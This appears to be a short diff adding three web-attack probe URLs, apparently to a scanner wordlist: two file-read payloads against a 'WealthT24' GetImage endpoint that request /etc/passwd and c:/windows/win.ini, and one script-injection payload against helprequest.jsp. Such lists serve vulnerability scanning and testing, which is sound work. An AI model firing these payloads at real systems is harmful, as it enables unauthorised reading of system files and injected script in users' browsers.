@@ -1,0 +1,3 @@
+/WealthT24/GetImage?docDownloadPath=/etc/passwd
+/WealthT24/GetImage?docDownloadPath=c:/windows/win.ini
+/jsps/helprequest.jsp?url=%27)%22+onerror=%22confirm(%27document.domain%27)%22
